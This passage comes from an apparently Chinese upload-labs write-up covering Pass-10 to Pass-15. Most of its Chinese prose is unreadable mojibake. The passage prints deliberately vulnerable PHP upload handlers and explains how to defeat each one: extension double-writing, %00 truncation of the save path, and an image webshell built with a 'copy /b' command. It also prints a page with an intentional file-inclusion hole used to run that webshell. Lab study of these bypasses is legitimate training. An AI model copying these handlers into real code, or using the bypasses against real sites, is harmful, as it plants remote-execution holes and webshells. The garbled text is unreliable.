¼ï¼Œå†å»é™¤æ–‡ä»¶åæœ€åæ‰€æœ‰çš„<code>.</code>ï¼Œå†é€šè¿‡strrcharå‡½æ•°æ¥å¯»æ‰¾<code>.</code>æ¥ç¡®è®¤æ–‡ä»¶åçš„åç¼€ï¼Œä½†æ˜¯æœ€åä¿å­˜æ–‡ä»¶çš„æ—¶å€™æ²¡æœ‰é‡å‘½åè€Œä½¿ç”¨çš„åŸå§‹çš„æ–‡ä»¶åï¼Œå¯¼è‡´å¯ä»¥åˆ©ç”¨1.php. .ï¼ˆç‚¹+ç©ºæ ¼+ç‚¹ï¼‰æ¥ç»•è¿‡<br><img src="https://img-blog.csdnimg.cn/20190618224551741.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/2019061822461747.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="Pass-10-åŒå†™ç»•è¿‡"><a href="#Pass-10-åŒå†™ç»•è¿‡" class="headerlink" title="Pass-10-åŒå†™ç»•è¿‡"></a>Pass-10-åŒå†™ç»•è¿‡</h2><p><strong>æºç ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,<span class="string">&quot;&quot;</span>, $file_name);</span><br><span class="line">        $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">1234567891011121314151617181920</span></span><br></pre></td></tr></table></figure><p>é»‘åå•è¿‡æ»¤ï¼Œå°†é»‘åå•é‡Œçš„åç¼€åæ›¿æ¢ä¸ºç©ºä¸”åªæ›¿æ¢ä¸€æ¬¡ï¼Œå› æ­¤å¯ä»¥ç”¨åŒå†™ç»•è¿‡<br><img src="https://img-blog.csdnimg.cn/20190619082922259.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20190619083032640.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="Pass-11-00æˆªæ–­"><a href="#Pass-11-00æˆªæ–­" class="headerlink" title="Pass-11-00æˆªæ–­"></a>Pass-11-00æˆªæ–­</h2><p><strong>æºç ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">&quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">12345678910111213141516171819</span></span><br></pre></td></tr></table></figure><p>ç™½åå•åˆ¤æ–­ï¼Œä½†$img_pathæ˜¯ç›´æ¥æ‹¼æ¥ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨%00æˆªæ–­ç»•è¿‡ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$img_path = $_GET[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$file_ext;</span><br><span class="line">æˆªæ–­æ¡ä»¶ï¼šphpç‰ˆæœ¬å°äº<span class="number">5.3</span><span class="number">.4</span>ï¼Œphpçš„magic_quotes_gpcä¸ºOFFçŠ¶æ€</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2019061908535953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20190619085428879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="Pass-12-00æˆªæ–­"><a href="#Pass-12-00æˆªæ–­" class="headerlink" title="Pass-12-00æˆªæ–­"></a>Pass-12-00æˆªæ–­</h2><p><strong>æºç ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        $img_path = $_POST[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;ä¸Šä¼ å¤±è´¥&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">&quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">12345678910111213141516171819</span></span><br></pre></td></tr></table></figure><p>save_pathå‚æ•°é€šè¿‡POSTæ–¹å¼ä¼ é€’ï¼Œè¿˜æ˜¯åˆ©ç”¨00æˆªæ–­ï¼Œå› ä¸ºPOSTä¸ä¼šåƒGETå¯¹%00è¿›è¡Œè‡ªåŠ¨è§£ç ï¼Œæ‰€ä»¥éœ€è¦åœ¨äºŒè¿›åˆ¶ä¸­è¿›è¡Œä¿®æ”¹ã€‚<br><img src="https://img-blog.csdnimg.cn/2019061909071992.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img src="https://img-blog.csdnimg.cn/2019061909081330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20190619090907698.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="Pass-13-å›¾ç‰‡é©¬ç»•è¿‡"><a href="#Pass-13-å›¾ç‰‡é©¬ç»•è¿‡" class="headerlink" title="Pass-13-å›¾ç‰‡é©¬ç»•è¿‡"></a>Pass-13-å›¾ç‰‡é©¬ç»•è¿‡</h2><p><strong>æºç ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params">$filename</span>)</span>&#123;</span><br><span class="line">    $file = fopen($filename, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    $bin = fread($file, <span class="number">2</span>); <span class="comment">//åªè¯»2å­—èŠ‚</span></span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">&quot;C2chars&quot;</span>, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[<span class="string">&#x27;chars1&#x27;</span>].$strInfo[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    $fileType = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>($typeCode)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            $fileType = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            $fileType = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            $fileType = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            $fileType = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> $fileType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    $file_type = getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($file_type == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        $msg = <span class="string">&quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$file_type;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">1234567891011121314151617181920212223242526272829303132333435363738394041</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡è¯»æ–‡ä»¶çš„å‰2ä¸ªå­—èŠ‚åˆ¤æ–­æ–‡ä»¶ç±»å‹ï¼Œå› æ­¤ç›´æ¥ä¸Šä¼ å›¾ç‰‡é©¬å³å¯ï¼Œåˆ¶ä½œå›¾ç‰‡é©¬ï¼š</p><blockquote><p>copy 22.jpg /b + 1.php /a shell.jpg</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20190619092253865.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç›´æ¥è®¿é—®å›¾ç‰‡å¹¶ä¸èƒ½æŠŠå›¾ç‰‡å½“åšPHPè§£æï¼Œå› æ­¤è¿˜éœ€è¦åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##include.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">æœ¬é¡µé¢å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œç”¨äºæµ‹è¯•å›¾ç‰‡é©¬æ˜¯å¦èƒ½æ­£å¸¸è¿è¡Œï¼</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line">$file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($file))&#123;</span><br><span class="line">    <span class="keyword">include</span> $file;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span><span class="number">123456789101112</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190619092621502.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="Pass-14-getimagesize-å›¾ç‰‡é©¬"><a href="#Pass-14-getimagesize-å›¾ç‰‡é©¬" class="headerlink" title="Pass-14-getimagesize()-å›¾ç‰‡é©¬"></a>Pass-14-getimagesize()-å›¾ç‰‡é©¬</h2><p><strong>æºç ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params">$filename</span>)</span>&#123;</span><br><span class="line">    $types = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos($types,$ext)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> $ext;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">&quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">1234567891011121314151617181920212223242526272829303132</span></span><br></pre></td></tr></table></figure><p>è¿™é¢˜æ˜¯ç”¨getimagesizeå‡½æ•°åˆ¤æ–­æ–‡ä»¶ç±»å‹ï¼Œè¿˜æ˜¯å¯ä»¥å›¾ç‰‡é©¬ç»•è¿‡ï¼Œæ–¹æ³•åŒpass-13<br><img src="https://img-blog.csdnimg.cn/20190619094339987.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="Pass-15-exif-imagetype-å›¾ç‰‡é©¬"><a href="#Pass-15-exif-imagetype-å›¾ç‰‡é©¬" class="headerlink" title="Pass-15-exif_imagetype()-å›¾ç‰‡é©¬"></a>Pass-15-exif_imagetype()-å›¾ç‰‡é©¬</h2><p><strong>æºç ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params">$filename</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//éœ€è¦å¼€å¯php_exifæ¨¡å—</span></span><br><span class="line">    $image_type = exif_imagetype($filename);</span><br><span class="line">    <span class="keyword">switch</span> ($image_type) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;gif&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;png&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">&quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 